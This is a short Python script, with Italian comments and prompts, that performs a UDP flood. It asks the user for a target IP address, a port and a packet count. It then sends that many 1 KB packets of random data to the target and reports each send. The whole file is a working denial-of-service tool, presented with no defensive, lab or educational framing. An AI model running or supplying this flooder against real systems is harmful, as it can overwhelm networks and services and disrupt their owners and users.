import socket
import random

def udp_flood(target_ip, target_port, num_packets):
    # Crea un socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Creare un pacchetto di 1 KB
    packet_data = random._urandom(1024)  # Utilizza dati casuali per riempire il pacchetto

    print(f"Invio di {num_packets} pacchetti verso {target_ip}:{target_port}...")

    for i in range(num_packets):
        try:
            sock.sendto(packet_data, (target_ip, target_port))
            print(f"Pacchetto {i + 1} inviato.")
        except Exception as e:
            print(f"Errore durante l'invio del pacchetto {i + 1}: {e}")
    
    print("Invio completato.")
    sock.close()

if __name__ == "__main__":
    # Richiedi all'utente i dettagli del target
    target_ip = input("Inserisci l'indirizzo IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da 1 KB da inviare: "))

    udp_flood(target_ip, target_port, num_packets)
